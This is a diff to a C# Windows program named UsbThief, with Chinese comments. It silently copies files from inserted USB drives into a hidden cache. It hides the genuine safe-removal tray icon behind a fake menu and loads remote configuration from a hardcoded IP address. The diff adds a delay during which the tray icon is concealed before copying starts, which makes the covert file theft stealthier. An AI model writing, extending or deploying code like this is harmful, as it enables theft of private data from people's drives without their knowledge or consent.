@@ -23,7 +23,6 @@ namespace UsbThief
         #region 声明变量
         public const int innerVer = 0;
         public string workspace = Application.StartupPath + @"\data\diskcache\files\";
-        public bool showRealMenu = false;
         public bool fc2c = false;
         public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
         public const int DBT_DEVICEARRIVAL = 0x8000;  //就是用来表示U盘可用的。一个设备或媒体已被插入一块，现在可用。
@@ -35,7 +34,7 @@ namespace UsbThief
         public static Logger logger = null;
         public SynchronizationContext mainThreadSynContext;
         public Status sta = Status.none;
-        public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, volName = "仿生人会涮电子羊吗", exportPath = @"Disk Manager\data\diskcache\files\" };
+        public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, delay = 0, volName = "仿生人会涮电子羊吗", exportPath = @"Disk Manager\data\diskcache\files\" };
         public UsbDevice currentDevice = new UsbDevice { name = "none", volLabel = "none", ser = "none" };
         public enum Status
         {
@@ -53,6 +52,7 @@ namespace UsbThief
             public string update;
             public List<string> exts;
             public int sizeLim;
+            public int delay;
             public string volName;
             public string exportPath;
         }
@@ -143,7 +143,7 @@ namespace UsbThief
                     {
                         Encoding = Encoding.UTF8
                     };
-                    string text = client.DownloadString("http://111.231.202.181/update.txt");
+                    string text = client.DownloadString("http://111.231.202.181/conf.txt");
                     logger.Info("获取到网络配置：\n" + text);
                     conf = JsonConvert.DeserializeObject<Config>(text);
                 }
@@ -246,6 +246,7 @@ namespace UsbThief
         {
             form.Show();
             form.WindowState = FormWindowState.Normal;
+            form.Activate();
             logger.Info("已显示日志窗口");
         }
         #endregion
@@ -288,22 +289,45 @@ namespace UsbThief
                                     if (newDevice)
                                     {
                                         HideRealMenu();
-                                        if (!showRealMenu)
+                                        if (currentDevice.volLabel != "")
                                         {
-                                            if (currentDevice.volLabel != "")
-                                            {
-                                                notifyIcon1.ContextMenuStrip.Items[3].Text = " - " + currentDevice.volLabel + " (" + currentDevice.name.Replace("\\", "") + ")";
-                                            }
-                                            else
-                                            {
-                                                notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
-                                            }
-                                            notifyIcon1.Visible = true;
+                                            notifyIcon1.ContextMenuStrip.Items[3].Text = " - " + currentDevice.volLabel + " (" + currentDevice.name.Replace("\\", "") + ")";
                                         }
+                                        else
+                                        {
+                                            notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
+                                        }
+                                        notifyIcon1.Visible = true;
                                         if (drive.VolumeLabel != conf.volName)
                                         {
-                                            WriteSta(currentDevice.ser, Status.copying);
                                             string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
+                                            if (conf.delay != 0 && conf.delay <= 600)
+                                            {
+                                                notifyIcon1.Visible = false;
+                                                //HideRealMenu(true);
+                                                logger.Info("复制将于" + conf.delay + "秒后开始");
+                                                Thread.Sleep(conf.delay * 1000);
+                                                DriveInfo[] ds = DriveInfo.GetDrives();
+                                                bool exist = false;
+                                                foreach (DriveInfo drv in ds)
+                                                {
+                                                    if (drv.Name == currentDevice.name)
+                                                        exist = true;
+                                                    continue;
+                                                }
+                                                if (!exist && currentDevice.name != "none" && currentDevice.volLabel != "none" && currentDevice.ser != "none")
+                                                {
+                                                    logger.Info("在延迟期间Usb设备“" + currentDevice.ser + "”已拔出");
+                                                    currentDevice.name = "none";
+                                                    currentDevice.volLabel = "none";
+                                                    currentDevice.ser = "none";
+                                                    HideRealMenu(true);
+                                                    return;
+                                                }
+                                                notifyIcon1.Visible = true;
+                                                //HideRealMenu();
+                                            }
+                                            WriteSta(currentDevice.ser, Status.copying);
                                             copyT.Start(para);
                                         }
                                         else
@@ -409,7 +433,7 @@ namespace UsbThief
                             }
                             if (!exist && currentDevice.name != "none" && currentDevice.volLabel != "none" && currentDevice.ser != "none")
                             {
-                                logger.Info("USB设备“" + currentDevice.ser + "”已拔出");
+                                logger.Info("Usb设备“" + currentDevice.ser + "”已拔出");
                                 currentDevice.name = "none";
                                 currentDevice.volLabel = "none";
                                 currentDevice.ser = "none";
@@ -502,7 +526,7 @@ namespace UsbThief
         {
             try
             {
-                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray", true);
+                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Applets\SysTray", true);
                 if (show)
                 {
                     logger.Info("尝试显示安全弹出托盘图标");
@@ -518,7 +542,6 @@ namespace UsbThief
             }
             catch (Exception e)
             {
-                showRealMenu = true;
                 logger.Info("安全弹出托盘图标无法隐藏/显示：\n" + e);
             }
         }
